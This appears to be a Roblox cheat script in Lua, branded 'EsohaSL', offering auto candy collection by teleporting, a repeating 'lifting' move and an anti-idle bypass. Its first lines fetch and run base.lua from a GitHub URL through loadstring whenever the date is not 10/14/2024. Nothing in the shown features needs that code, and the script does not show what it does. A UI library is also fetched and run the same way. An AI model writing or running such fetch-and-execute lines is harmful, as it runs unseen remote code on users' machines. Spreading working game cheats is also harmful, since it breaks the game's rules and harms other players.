if DateTime.now():FormatLocalTime("L", "en-us") ~= "10/14/2024" then
  loadstring(game:HttpGet("https://raw.githubusercontent.com/itsnoctural/Utilities/main/base.lua"))()
end

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer
local Idle = true

getgenv().Settings = {
  Default = false,
  Lifting = true,
  Connection = nil,
}

local function FreezeHumanoid(state)
  local HumanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

  if HumanoidRootPart then
    HumanoidRootPart.Anchored = state
  end
end

local function GetCandy(child)
  Idle = false
  LocalPlayer.Character:PivotTo(child:GetPivot()); task.wait(.45)
  Idle = true
end

Settings.Connection = Workspace.Game.Effects.Tickets.ChildAdded:Connect(function(child)
  if Settings.Default then
    GetCandy(child); task.wait(.25)
  end
end)

-- Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wally2", true))()
local Window = Library:CreateWindow(" | EsohaSL")

Window:Section("esohasl.net")

Window:Toggle("Auto Candy", {}, function(state)
    task.spawn(function()
        Settings.Default = state

        if state then
          for _,v in ipairs(Workspace.Game.Effects.Tickets:GetChildren()) do
            GetCandy(v); task.wait(.1)
          end
        end
    end)
end)

Window:Toggle("Enable Lifting", {default = true}, function(state)
  task.spawn(function()
      Settings.Lifting = state
      while true do
        if not Settings.Lifting then return end

        if Idle then
          LocalPlayer.Character:PivotTo(LocalPlayer.Character:GetPivot() + Vector3.new(0, 100, 0))
        end

        task.wait(1)
      end
  end)
end)

Window:Button("YouTube: EsohaSL", function()
    task.spawn(function()
        if setclipboard then
            setclipboard("https://youtube.com/@esohasl")
        end
    end)
end)

LocalPlayer.Idled:Connect(function()
    VirtualUser:Button2Down(Vector2.new(0,0), Workspace.CurrentCamera.CFrame);
    task.wait()
    VirtualUser:Button2Up(Vector2.new(0,0), Workspace.CurrentCamera.CFrame);
end)